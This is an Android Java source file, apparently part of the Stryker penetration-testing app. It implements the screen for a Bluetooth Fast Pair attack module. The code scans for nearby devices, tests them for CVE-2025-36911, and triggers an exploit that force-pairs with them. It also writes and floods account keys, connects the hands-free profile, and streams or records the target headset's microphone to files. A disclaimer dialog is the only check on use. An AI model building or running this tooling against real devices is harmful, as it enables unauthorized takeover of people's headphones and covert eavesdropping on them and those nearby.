package com.zalexdev.stryker.wpair;

import android.Manifest;
import android.app.Activity;
import android.bluetooth.BluetoothAdapter;
import android.bluetooth.BluetoothManager;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.TextView;
import android.widget.Toast;

import androidx.activity.result.ActivityResultLauncher;
import androidx.activity.result.contract.ActivityResultContracts;
import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.core.content.ContextCompat;
import androidx.fragment.app.Fragment;
import androidx.recyclerview.widget.LinearLayoutManager;
import androidx.recyclerview.widget.RecyclerView;

import com.google.android.material.button.MaterialButton;
import com.google.android.material.chip.ChipGroup;
import com.google.android.material.dialog.MaterialAlertDialogBuilder;
import com.google.android.material.floatingactionbutton.ExtendedFloatingActionButton;
import com.zalexdev.stryker.R;
import com.zalexdev.stryker.utils.Core;

import java.io.File;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;
import java.util.Set;
import java.util.concurrent.atomic.AtomicBoolean;

public class WpairFragment extends Fragment implements WpairDeviceAdapter.Listener {

    private static final String PREFS_NAME = "wpair_prefs";
    private static final String KEY_PAIRED = "paired_addresses";
    private static final String KEY_DISCLAIMER_ACK = "disclaimer_ack";

    private static final String CORE_KEY_SHOW_ALL_BLE = "wpair_show_all_ble";
    private static final String CORE_KEY_FILTER = "wpair_filter_id";

    private Core core;

    private final AtomicBoolean alive = new AtomicBoolean(false);

    private WpairScanner scanner;
    private VulnerabilityTester tester;
    private FastPairExploit exploit;
    private BluetoothAudioManager audio;

    private WpairDeviceAdapter adapter;
    private RecyclerView recycler;
    private View emptyState;
    private TextView statTotal, statVulnerable, statPaired;
    private ChipGroup filterGroup;
    private ExtendedFloatingActionButton fab;

    private boolean scanning = false;
    private boolean showAllBle = false;
    private final Set<String> pairedAddresses = new HashSet<>();
    private final Map<String, String> liveProgress = new HashMap<>();

    private ActivityResultLauncher<String[]> permissionLauncher;
    private ActivityResultLauncher<Intent> btEnableLauncher;

    public static File recordingsDir(Context ctx) {
        File dir = ctx.getExternalFilesDir(null);
        if (dir == null) dir = ctx.getFilesDir();
        File sub = new File(dir, "wpair-recordings");
        if (!sub.exists()) sub.mkdirs();
        return sub;
    }

    @Override
    public void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        permissionLauncher = registerForActivityResult(
                new ActivityResultContracts.RequestMultiplePermissions(),
                results -> {
                    boolean allGranted = true;
                    for (Boolean v : results.values()) {
                        if (!Boolean.TRUE.equals(v)) { allGranted = false; break; }
                    }
                    if (allGranted) {
                        if (isBluetoothEnabled()) startScan();
                        else promptEnableBluetooth();
                    } else {
                        promptOpenSettings();
                    }
                });

        btEnableLauncher = registerForActivityResult(
                new ActivityResultContracts.StartActivityForResult(),
                r -> {
                    if (isBluetoothEnabled()) startScan();
                });
    }

    @Nullable
    @Override
    public View onCreateView(@NonNull LayoutInflater inflater,
                             @Nullable ViewGroup container,
                             @Nullable Bundle savedInstanceState) {
        return inflater.inflate(R.layout.fragment_wpair_main, container, false);
    }

    @Override
    public void onViewCreated(@NonNull View view, @Nullable Bundle savedInstanceState) {
        Context ctx = requireContext();
        alive.set(true);
        core = new Core(ctx);

        BluetoothManager mgr = (BluetoothManager) ctx.getSystemService(Context.BLUETOOTH_SERVICE);
        BluetoothAdapter btAdapter = mgr == null ? null : mgr.getAdapter();

        tester = new VulnerabilityTester(ctx);
        exploit = new FastPairExploit(ctx);
        audio = new BluetoothAudioManager(ctx);
        audio.initialize(ready -> { });

        scanner = new WpairScanner(ctx, btAdapter, this::onDeviceFound);

        SharedPreferences prefs = ctx.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
        pairedAddresses.clear();
        pairedAddresses.addAll(prefs.getStringSet(KEY_PAIRED, new HashSet<>()));

        showAllBle = core.getBoolean(CORE_KEY_SHOW_ALL_BLE);

        recycler = view.findViewById(R.id.wpair_devices);
        emptyState = view.findViewById(R.id.wpair_empty);
        statTotal = view.findViewById(R.id.wpair_stat_total);
        statVulnerable = view.findViewById(R.id.wpair_stat_vulnerable);
        statPaired = view.findViewById(R.id.wpair_stat_paired);
        filterGroup = view.findViewById(R.id.wpair_filters);
        fab = view.findViewById(R.id.wpair_fab);

        adapter = new WpairDeviceAdapter(ctx, this);
        adapter.setPairedAddresses(pairedAddresses);
        recycler.setLayoutManager(new LinearLayoutManager(getContext()));
        recycler.setAdapter(adapter);

        filterGroup.setOnCheckedStateChangeListener((group, checkedIds) -> {
            if (checkedIds.isEmpty()) return;
            int id = checkedIds.get(0);
            if (id == R.id.wpair_filter_fastpair) {
                showAllBle = false;
                core.putBoolean(CORE_KEY_SHOW_ALL_BLE, false);
                adapter.setFilter(WpairDeviceAdapter.Filter.FAST_PAIR);
                if (scanning) restartScan();
            } else if (id == R.id.wpair_filter_all) {
                showAllBle = true;
                core.putBoolean(CORE_KEY_SHOW_ALL_BLE, true);
                adapter.setFilter(WpairDeviceAdapter.Filter.ALL);
                if (scanning) restartScan();
            } else if (id == R.id.wpair_filter_vulnerable) {
                adapter.setFilter(WpairDeviceAdapter.Filter.VULNERABLE);
            } else if (id == R.id.wpair_filter_paired) {
                adapter.setFilter(WpairDeviceAdapter.Filter.PAIRED);
            }
            core.putInt(CORE_KEY_FILTER, id);
            refreshEmptyState();
        });

        int savedFilterId = core.getInt(CORE_KEY_FILTER, R.id.wpair_filter_fastpair);
        if (filterGroup.findViewById(savedFilterId) != null) {
            filterGroup.check(savedFilterId);
        }

        view.<MaterialButton>findViewById(R.id.wpair_terminal_btn).setOnClickListener(v -> openTerminal(null));
        view.<MaterialButton>findViewById(R.id.wpair_recordings_btn).setOnClickListener(v -> openRecordings());
        view.<MaterialButton>findViewById(R.id.wpair_clear_btn).setOnClickListener(v -> {
            adapter.clearAll();
            liveProgress.clear();
            refreshStats();
            refreshEmptyState();
        });

        fab.setOnClickListener(v -> {
            if (scanning) stopScan();
            else maybeStartScan();
        });

        refreshStats();
        refreshEmptyState();

        if (!prefs.getBoolean(KEY_DISCLAIMER_ACK, false)) {
            new MaterialAlertDialogBuilder(ctx)
                    .setTitle(R.string.wpair_disclaimer_title)
                    .setMessage(R.string.wpair_disclaimer_msg)
                    .setCancelable(false)
                    .setPositiveButton(R.string.wpair_disclaimer_accept, (d, w) ->
                            prefs.edit().putBoolean(KEY_DISCLAIMER_ACK, true).apply())
                    .show();
        }
    }

    @Override
    public void onDestroyView() {
        alive.set(false);
        super.onDestroyView();
        if (scanner != null) scanner.stop();
        scanning = false;
    }

    @Override
    public void onDestroy() {
        alive.set(false);
        super.onDestroy();
        if (audio != null) audio.release();
    }

    private boolean canTouchUi() {
        return alive.get() && getActivity() != null && isAdded();
    }

    private void maybeStartScan() {
        if (!hasPermissions()) {
            permissionLauncher.launch(requiredPermissions());
            return;
        }
        if (!isBluetoothEnabled()) {
            promptEnableBluetooth();
            return;
        }
        startScan();
    }

    private void startScan() {
        if (scanner == null) return;
        boolean ok = scanner.start(showAllBle);
        if (!ok) {
            String why = scanner.lastError();
            Toast.makeText(getContext(),
                    "Scan start failed: " + (why == null ? "unknown" : why),
                    Toast.LENGTH_LONG).show();
            if (why != null && why.toLowerCase().contains("off")) {
                promptEnableBluetooth();
            } else if (why != null && why.toLowerCase().contains("permission")) {
                permissionLauncher.launch(requiredPermissions());
            }
            return;
        }
        scanning = true;
        fab.setText(R.string.wpair_fab_stop);
        fab.setIcon(ContextCompat.getDrawable(requireContext(), R.drawable.stop));
        WpairLog.info(requireContext(), null, "user start scan (allBle=" + showAllBle + ")");
    }

    private void stopScan() {
        if (scanner != null) scanner.stop();
        scanning = false;
        fab.setText(R.string.wpair_fab_scan);
        fab.setIcon(ContextCompat.getDrawable(requireContext(), R.drawable.scanner));
    }

    private void restartScan() {
        if (scanner != null) {
            scanner.stop();
            scanner.start(showAllBle);
        }
    }

    private void onDeviceFound(FastPairDevice device) {
        if (!canTouchUi()) return;
        Activity a = getActivity();
        if (a == null) return;
        a.runOnUiThread(() -> {
            if (!canTouchUi()) return;
            adapter.upsert(device);
            refreshStats();
            refreshEmptyState();
        });
    }

    @Override
    public void onTest(FastPairDevice device) {
        if (tester == null) return;
        adapter.updateStatus(device.getAddress(), FastPairDevice.Status.TESTING);
        setProgress(device.getAddress(), "Testing for CVE-2025-36911...");
        tester.testDevice(device.getAddress(), status -> {
            if (!canTouchUi()) return;
            Activity a = getActivity();
            if (a == null) return;
            a.runOnUiThread(() -> {
                if (!canTouchUi()) return;
                adapter.updateStatus(device.getAddress(), status);
                setProgress(device.getAddress(), null);
                refreshStats();
            });
        });
    }

    @Override
    public void onMagic(FastPairDevice device) {
        if (exploit == null) return;
        setProgress(device.getAddress(), "Initializing exploit...");
        exploit.exploit(device.getAddress(),
                progress -> {
                    if (!canTouchUi()) return;
                    Activity a = getActivity();
                    if (a == null) return;
                    a.runOnUiThread(() -> {
                        if (!canTouchUi()) return;
                        setProgress(device.getAddress(), progress);
                    });
                },
                result -> {
                    if (!canTouchUi()) return;
                    Activity a = getActivity();
                    if (a == null) return;
                    a.runOnUiThread(() -> {
                        if (!canTouchUi()) return;
                        handleExploitResult(device, result);
                    });
                });
    }

    @Override
    public void onOpenActions(FastPairDevice device) {
        WpairDeviceDialog dlg = WpairDeviceDialog.create(device, new WpairDeviceDialog.Listener() {
            @Override public void onTest() { WpairFragment.this.onTest(device); }
            @Override public void onMagic() { WpairFragment.this.onMagic(device); }
            @Override public void onWriteAccountKey() { writeAccountKey(device); }
            @Override public void onFloodKeys() { floodKeys(device); }
            @Override public void onConnectHfp() { connectHfp(device); }
            @Override public void onStartLive() { startLive(device); }
            @Override public void onStopLive() { audio.stopListening(); }
            @Override public void onStartRecord() { startRecord(device); }
            @Override public void onStopRecord() { audio.stopRecording(); }
            @Override public void onOpenTerminal() { openTerminal(device.getAddress()); }
        });
        dlg.show(getChildFragmentManager(), "wpair_actions");
    }

    private void writeAccountKey(FastPairDevice device) {
        setProgress(device.getAddress(), "Writing account key...");
        exploit.writeAccountKeyDirect(device.getAddress(), result -> {
            if (!canTouchUi()) return;
            Activity a = getActivity();
            if (a == null) return;
            a.runOnUiThread(() -> {
                if (!canTouchUi()) return;
                if (result instanceof FastPairExploit.Result.AccountKeyResult) {
                    FastPairExploit.Result.AccountKeyResult ak = (FastPairExploit.Result.AccountKeyResult) result;
                    setProgress(device.getAddress(),
                            ak.success ? "KEY: " + ak.message : "FAILED: " + ak.message);
                }
            });
        });
    }

    private void floodKeys(FastPairDevice device) {
        setProgress(device.getAddress(), "Flooding: 0/10...");
        exploit.floodAccountKeys(device.getAddress(), 10, (current, total, done) -> {
            if (!canTouchUi()) return;
            Activity a = getActivity();
            if (a == null) return;
            a.runOnUiThread(() -> {
                if (!canTouchUi()) return;
                setProgress(device.getAddress(),
                        done ? "FLOOD: " + current + "/" + total + " done"
                             : "Flooding: " + current + "/" + total + "...");
            });
        });
    }

    private void connectHfp(FastPairDevice device) {
        if (audio == null) return;
        setProgress(device.getAddress(), "Connecting HFP...");
        audio.connectAudioProfile(device.getAddress(), state -> {
            if (!canTouchUi()) return;
            Activity a = getActivity();
            if (a == null) return;
            a.runOnUiThread(() -> {
                if (!canTouchUi()) return;
                if (state instanceof BluetoothAudioManager.AudioState.Connected) {
                    setProgress(device.getAddress(), "HFP connected - ready for audio");
                } else if (state instanceof BluetoothAudioManager.AudioState.Error) {
                    String msg = ((BluetoothAudioManager.AudioState.Error) state).message;
                    String userMsg;
                    switch (msg) {
                        case "HFP_PERMISSION_DENIED":
                        case "HFP_MANUAL_REQUIRED":
                            userMsg = "Manual connection required";
                            promptManualHfp();
                            break;
                        case "HFP_TIMEOUT":
                            userMsg = "Connection timed out";
                            break;
                        default:
                            userMsg = msg;
                    }
                    setProgress(device.getAddress(), userMsg);
                }
            });
        });
    }

    private void startLive(FastPairDevice device) {
        if (audio == null) return;
        setProgress(device.getAddress(), "Starting live audio...");
        audio.startListening(state -> {
            if (!canTouchUi()) return;
            Activity a = getActivity();
            if (a == null) return;
            a.runOnUiThread(() -> {
                if (!canTouchUi()) return;
                if (state instanceof BluetoothAudioManager.AudioState.Listening) {
                    setProgress(device.getAddress(), "LIVE — listening to mic");
                } else if (state instanceof BluetoothAudioManager.AudioState.Error) {
                    setProgress(device.getAddress(), "Error: " + ((BluetoothAudioManager.AudioState.Error) state).message);
                } else if (state instanceof BluetoothAudioManager.AudioState.Connected) {
                    setProgress(device.getAddress(), "Stopped listening");
                }
            });
        });
    }

    private void startRecord(FastPairDevice device) {
        if (audio == null) return;
        File out = recordingsDir(requireContext());
        setProgress(device.getAddress(), "Recording...");
        audio.startRecording(out,
                state -> {
                    if (!canTouchUi()) return;
                    Activity a = getActivity();
                    if (a == null) return;
                    a.runOnUiThread(() -> {
                        if (!canTouchUi()) return;
                        if (state instanceof BluetoothAudioManager.AudioState.Recording) {
                            setProgress(device.getAddress(), "Recording microphone...");
                        } else if (state instanceof BluetoothAudioManager.AudioState.Error) {
                            setProgress(device.getAddress(),
                                    "Error: " + ((BluetoothAudioManager.AudioState.Error) state).message);
                        }
                    });
                },
                info -> {
                    if (!canTouchUi()) return;
                    Activity a = getActivity();
                    if (a == null) return;
                    a.runOnUiThread(() -> {
                        if (!canTouchUi()) return;
                        long seconds = info.durationMs / 1000;
                        setProgress(device.getAddress(),
                                "Saved: " + info.file.getName() + " (" + seconds + "s)");
                    });
                });
    }

    private void handleExploitResult(FastPairDevice device, FastPairExploit.Result result) {
        if (result instanceof FastPairExploit.Result.Success) {
            FastPairExploit.Result.Success s = (FastPairExploit.Result.Success) result;
            setProgress(device.getAddress(), "PAIRED! BR/EDR: " + s.brEdrAddress);
            markPaired(device.getAddress());
        } else if (result instanceof FastPairExploit.Result.PartialSuccess) {
            FastPairExploit.Result.PartialSuccess p = (FastPairExploit.Result.PartialSuccess) result;
            setProgress(device.getAddress(), "PARTIAL " + p.brEdrAddress + " — " + p.message);
            markPaired(device.getAddress());
        } else if (result instanceof FastPairExploit.Result.Failed) {
            setProgress(device.getAddress(), "FAILED: " + ((FastPairExploit.Result.Failed) result).reason);
        } else if (result instanceof FastPairExploit.Result.AccountKeyResult) {
            FastPairExploit.Result.AccountKeyResult ak = (FastPairExploit.Result.AccountKeyResult) result;
            setProgress(device.getAddress(), (ak.success ? "KEY: " : "FAILED: ") + ak.message);
        }
    }

    private void markPaired(String address) {
        if (address == null) return;
        pairedAddresses.add(address);
        adapter.markPaired(address);
        requireContext().getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
                .edit()
                .putStringSet(KEY_PAIRED, pairedAddresses)
                .apply();
        refreshStats();
    }

    private void setProgress(String address, String message) {
        if (message == null) liveProgress.remove(address);
        else liveProgress.put(address, message);
        adapter.setProgress(address, message);
    }

    private void refreshStats() {
        statTotal.setText(String.valueOf(adapter.totalCount()));
        statVulnerable.setText(String.valueOf(adapter.vulnerableCount()));
        statPaired.setText(String.valueOf(adapter.pairedCount()));
    }

    private void refreshEmptyState() {
        boolean empty = adapter.getItemCount() == 0;
        emptyState.setVisibility(empty ? View.VISIBLE : View.GONE);
        recycler.setVisibility(empty ? View.GONE : View.VISIBLE);
    }

    private void openTerminal(String hostFilter) {
        WpairTerminal t = hostFilter == null ? WpairTerminal.newInstance() : WpairTerminal.forHost(hostFilter);
        requireActivity().getSupportFragmentManager().beginTransaction()
                .replace(R.id.flContent, t)
                .addToBackStack("wpair_terminal")
                .commit();
    }

    private void openRecordings() {
        requireActivity().getSupportFragmentManager().beginTransaction()
                .replace(R.id.flContent, new WpairRecordingsFragment())
                .addToBackStack("wpair_recordings")
                .commit();
    }

    private String[] requiredPermissions() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            return new String[]{
                    Manifest.permission.BLUETOOTH_SCAN,
                    Manifest.permission.BLUETOOTH_CONNECT,
                    Manifest.permission.RECORD_AUDIO
            };
        }
        return new String[]{
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.BLUETOOTH,
                Manifest.permission.BLUETOOTH_ADMIN,
                Manifest.permission.RECORD_AUDIO
        };
    }

    private boolean hasPermissions() {
        for (String p : requiredPermissions()) {
            if (ContextCompat.checkSelfPermission(requireContext(), p)
                    != PackageManager.PERMISSION_GRANTED) return false;
        }
        return true;
    }

    private boolean isBluetoothEnabled() {
        BluetoothManager mgr = (BluetoothManager) requireContext().getSystemService(Context.BLUETOOTH_SERVICE);
        BluetoothAdapter a = mgr == null ? null : mgr.getAdapter();
        return a != null && a.isEnabled();
    }

    private void promptEnableBluetooth() {
        new MaterialAlertDialogBuilder(requireContext())
                .setTitle(R.string.wpair_bt_disabled_title)
                .setMessage(R.string.wpair_bt_disabled_msg)
                .setPositiveButton(R.string.wpair_bt_enable, (d, w) ->
                        btEnableLauncher.launch(new Intent(BluetoothAdapter.ACTION_REQUEST_ENABLE)))
                .setNegativeButton(android.R.string.cancel, null)
                .show();
    }

    private void promptOpenSettings() {
        new MaterialAlertDialogBuilder(requireContext())
                .setTitle(R.string.wpair_perm_title)
                .setMessage(R.string.wpair_perm_msg)
                .setPositiveButton(R.string.wpair_perm_open_settings, (d, w) -> {
                    Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
                    intent.setData(Uri.fromParts("package", requireContext().getPackageName(), null));
                    startActivity(intent);
                })
                .setNegativeButton(android.R.string.cancel, null)
                .show();
    }

    private void promptManualHfp() {
        new MaterialAlertDialogBuilder(requireContext())
                .setTitle(R.string.wpair_hfp_manual_title)
                .setMessage(R.string.wpair_hfp_manual_msg)
                .setPositiveButton(R.string.wpair_hfp_open_bt_settings, (d, w) ->
                        startActivity(new Intent(Settings.ACTION_BLUETOOTH_SETTINGS)))
                .setNegativeButton(android.R.string.cancel, null)
                .show();
    }
}
